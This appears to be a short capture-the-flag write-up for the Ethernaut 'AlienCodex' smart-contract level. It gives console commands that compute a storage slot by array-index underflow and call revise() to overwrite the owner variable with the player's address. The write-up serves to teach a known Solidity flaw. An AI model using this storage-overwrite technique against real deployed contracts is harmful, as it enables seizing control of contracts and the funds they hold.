First we need to call the make_contact in order to interact with AlienCodex functions.

```bash
web3.utils.keccak256(web3.abi.encodeParameters([“uint256”],[1]))
```

The above command basically outputs the slot location of the first array element stored in the codex. [1] is used because this is where the array length value is stored.
We are doing this so that we can get to the slot 0 where owner variable is stored. This way we can get the position where owner is stored and revise it

```bash
i = BigInt(2 ** 256) — BigInt(p)
```

Now, we convert the hash value to BigInt and subtract it from BigInt(2²⁵⁶) to access slot0 of contract storage. This is where in the owner address is stored.

```bash
content = ‘0x’ + ‘0’.repeat(24) + player.slice(2)
```

Create a 32 byte content containing the padding and player address.

```bash
contract.revise(i, content)
```

Update the content at the location to make the player the owner of the contract.
